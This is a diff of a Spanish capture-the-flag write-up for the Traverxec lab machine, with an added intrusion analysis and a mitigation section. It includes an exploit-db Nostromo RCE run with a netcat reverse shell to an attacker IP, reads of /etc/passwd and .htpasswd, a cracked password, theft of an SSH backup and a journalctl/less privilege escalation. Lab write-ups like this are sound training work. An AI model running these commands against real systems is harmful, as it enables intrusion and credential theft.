@@ -14,7 +14,6 @@
 
 ```
 ## Exploit
-
 La version de Nostromo es vulnerable a RCE, para ello utilizaremos el siguiente exploit
 ```
 https://www.exploit-db.com/exploits/47837
@@ -23,10 +22,7 @@ Rapidamente obtenemos una reverse shell
 ```
 python2.7 exploit.py 10.10.10.165 80 'nc 10.10.14.15 4444 -e /bin/bash'
 ```
-
 ## David
-
-
 ### Enumerar usuarios con acceso via shell
 ```bash
 cat /etc/passwd | grep bash'
@@ -34,16 +30,13 @@ cat /etc/passwd | grep bash'
 root:x:0:0:root:/root:/bin/bash
 david:x:1000:1000:david,,,:/home/david:/bin/bash
 ```
-
 ### Encontar contraseñas 
-
 ```bash
 www-data@traverxec$ cat /var/nostromo/conf/.htpasswd
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 ```
 La crackeamos y tenemos las creds david:Nowonly4me
 ### Checkear la presencia de homedirs
-
 ```bash
 www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf | grep homedirs
 homedirs		/home
@@ -52,7 +45,6 @@ homedirs_public		public_www
 Como los homedirs podemos acceder a /home/david/public_www
 
 ### Exfiltrar el archivo de backups
-
 ```bash
 www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
 -rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
@@ -73,7 +65,6 @@ david@traverxec:~$ wc -c user.txt
 ```
 
 ## Privesc
-
 Mirando los archivos que tenemos encontramos un script un tanto sospechoso dentro de la carpeta bin en la carpeta de David
 
 ```bash
@@ -108,3 +99,36 @@ uid=0(root) gid=0(root) groups=0(root)
 # wc -c /root/root.txt
 33 /root/root.txt
 ```
+# Analisís de la intrusión
+### CVE-2019-16278
+La versión usada de Nostromo es vulnerable a RCE, lo que nos permite obtener una shell en la máquina 
+### Homedirs
+En la documentación de Nostromo se habla de los llamado homedirs, esto nos permite leer el home de davud
+### Bad password police
+Varias contraseñas del sistema se encuentra dentro de rockyou
+### Privileged journalctl +less execution
+Usando una terminal mas pequeña para forzar el lanzamiento del paginador podemos spawnear una shell con los privilegios con los que se lanza journalctl
+
+# Soluciones
+### Homedirs
+Sobre los homedirs en la documentación de Nostromo encontramos lo siguiente
+```
+     To serve the home directories of your users via HTTP, enable the homedirs
+     option by defining the path in where the home directories are stored,
+     normally /home.  To access a users home directory enter a ~ in the URL
+     followed by the home directory name like in this example:
+
+           http://www.nazgul.ch/~hacki/
+
+     The content of the home directory is handled exactly the same way as a
+     directory in your document root.  If some users don't want that their
+     home directory can be accessed via HTTP, they shall remove the world
+     readable flag on their home directory and a caller will receive a 403
+     Forbidden response.  Also, if basic authentication is enabled, a user can
+     create an .htaccess file in his home directory and a caller will need to
+     authenticate.
+
+     You can restrict the access within the home directories to a single sub
+     directory by defining it via the homedirs_public option.
+```
+Como vemos, conseguir mitigar este vector de acceso es cuestión de crear un archivo de .htaccess en el /home o deshabilitar la opción
